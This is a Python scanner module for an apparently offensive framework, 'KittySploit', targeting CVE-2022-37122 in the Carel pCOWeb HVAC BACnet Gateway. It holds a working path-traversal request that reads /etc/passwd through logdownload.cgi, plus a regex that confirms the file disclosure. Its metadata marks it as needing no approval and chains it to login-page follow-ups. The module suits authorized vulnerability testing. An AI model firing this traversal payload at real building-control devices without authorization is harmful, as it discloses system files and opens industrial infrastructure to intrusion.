#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Carel pCOWeb HVAC BACnet Gateway 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Carel pCOWeb HVAC BACnet Gateway 2.1.0 - Path Traversal Detection',
        'description': "Carel pCOWeb HVAC BACnet Gateway 2.1.0 contains an unauthenticated arbitrary file disclosure caused by improper verification of the 'file' GET parameter in logdownload.cgi, letting attackers disclose sensitive files via directory traversal, exploit requires no authentication.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'carel', 'lfi', 'traversal', 'unauth', 'bacnet', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5709.php',
            'https://www.zeroscience.mk/codes/carelpco_dir.txt',
            'https://packetstormsecurity.com/files/167684/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-37122',
        ],
        'cve': 'CVE-2022-37122',
    }

    def run(self):
        r = self.http_request(method="GET", path='/usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Carel pCOWeb HVAC BACnet Gateway 2.1.0 - Path Traversal detected",
                path='/usr-cgi/logdownload.cgi?file=../../../../../../../../etc/passwd',
            )
            return True
        return False

